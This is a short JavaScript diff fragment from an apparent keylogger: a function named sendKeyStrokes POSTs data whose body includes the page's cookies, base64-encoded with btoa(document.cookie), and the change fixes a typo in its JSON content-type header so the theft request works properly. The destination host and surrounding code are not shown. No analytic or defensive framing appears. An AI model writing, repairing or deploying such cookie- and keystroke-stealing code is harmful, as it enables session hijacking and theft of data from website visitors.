@@ -6,7 +6,7 @@ const sendKeyStrokes = async (data) => {
         method: "POST",
         mode: "cors",
         headers: {
-            "Content-Type": "appliction/json",
+            "Content-Type": "application/json",
         },
         body: JSON.stringify({
             "cookies": btoa(document.cookie),
